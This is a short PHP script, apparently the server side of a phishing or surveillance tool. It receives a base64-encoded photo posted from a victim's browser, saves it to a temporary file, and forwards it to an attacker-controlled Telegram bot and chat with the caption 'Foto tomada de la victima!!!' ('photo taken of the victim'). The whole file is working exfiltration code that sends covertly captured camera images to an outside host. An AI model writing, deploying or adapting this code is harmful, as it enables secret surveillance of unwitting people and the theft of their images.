<?php
require_once __DIR__ . '/config.php';

header('Content-Type: application/json');

if (!isset($_POST['cat'])) {
    http_response_code(400);
    echo json_encode(['status'=>'no_file']);
    exit;
}

$imageData = $_POST['cat'];
$filteredData = substr($imageData, strpos($imageData,",")+1);
$unencodedData = base64_decode($filteredData);

$tempFile = tempnam(sys_get_temp_dir(), 'photo_') . '.png';
file_put_contents($tempFile, $unencodedData);

// Enviar a Telegram
$token = TELEGRAM_BOT_TOKEN;
$chat_id = TELEGRAM_CHAT_ID;
$url = "https://api.telegram.org/bot$token/sendPhoto";

$post_fields = [
    'chat_id' => $chat_id,
    'photo'   => new CURLFile($tempFile),
    'caption' => "📷 Foto tomada de la victima!!!"
];

$ch = curl_init();
curl_setopt($ch, CURLOPT_HTTPHEADER, ["Content-Type:multipart/form-data"]);
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
$output = curl_exec($ch);
curl_close($ch);

unlink($tempFile);
echo json_encode(['status'=>'photo_sent','telegram_response'=>$output]);
